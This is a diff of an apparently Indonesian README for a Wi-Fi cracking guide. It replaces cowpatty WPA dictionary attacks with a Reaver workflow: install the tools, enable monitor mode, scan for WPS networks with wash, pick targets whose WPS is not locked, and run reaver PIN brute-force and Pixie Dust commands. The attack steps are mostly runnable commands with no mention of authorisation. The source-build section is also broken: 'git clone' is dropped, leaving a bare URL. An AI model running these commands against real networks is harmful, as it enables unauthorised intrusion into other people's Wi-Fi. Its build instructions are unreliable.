@@ -6,43 +6,67 @@
 
 Kali Linux:
 
-```
-sudo apt-get update
-sudo apt -y install reaver aircrack-ng pixiewps
-```
+1. Menggunakan packet manager (`apt`):
+
+   ```
+   sudo apt-get update
+   sudo apt install reaver aircrack-ng pixiewps
+   ```
 
 2. Melalui compile dari source:
    
    ```
    sudo apt-get update
    sudo apt-get install build-essential libpcap-dev git
-   git clone https://github.com/t6x/reaver-wps-fork-t6x
+   https://github.com/t6x/reaver-wps-fork-t6x
    cd reaver-wps-fork-t6x
    make
    sudo make install
    ```
 
+## Setup Adapter Wi-Fi
+
+1. Pasang adapter Wi-Fi ke laptop/PC.
+2. Pada aplikasi VirtualBox klik tab `Devices` -> `USB` -> `Jenis/merek`.
+3. Pastikan checkbox nya sudah tercentang.
+4. Buka terminal.
+5. Ketikkan `iwconfig`, pastikan nama interface `wlan0` muncul.
+6. Kalau sudah muncul, aktifkan mode monitor menggunakan:
+
+   ```
+   sudo airmon-ng check kill
+   sudo airmon-ng start wlan0
+   ```
+7. Cek kembali menggunakan `iwconfig` apakah mode interfacenya sudah berubah menjadi mode `Monitor`.
+8. Cek packet injection menggunakan:
+
+   ```
+   sudo aireplay-ng --test wlan0
+   ```
+   
 ## Penggunaan
 
-### 1. Dictionary Attack (Manual/Basic)
-
-Jalankan Cowpatty:
+### 1. Scan Wi-Fi WPS:
 
 ```
-cowpatty -f [wordlist] -r [file_capture] -s [ssid] -v
+sudo wash -i [interface]
 ```
 
-### 2. Pre-computed PMK Caching
+### 2. Pilih Taraget
 
-1. Buat hash PMK terlebih dahulu menggunakan `genpmk`:
+Pastikan status `Lck` (Lock) tidak menunjukkan `YES`. Jika `YES`, artinya fitur WPS sedang terkunci (tidak bisa diserang).
+
+### 3. Jalankan Serangan
+
+1. PIN Brute Force Attack:
 
    ```
-   genpmk -f [wordlist] -d [output] -s [ssid] -v
+   sudo reaver -i [interface] -b [bssid] -c [channel] -vv
    ```
-2. Jalankan Cowpatty:
+2. Pixie Dust Attack
 
    ```
-   cowpatty -d [hash_pmk] -r [file_capture] -s [ssid] -v
+   sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
    ```
 
 ## Video Demonstrasi
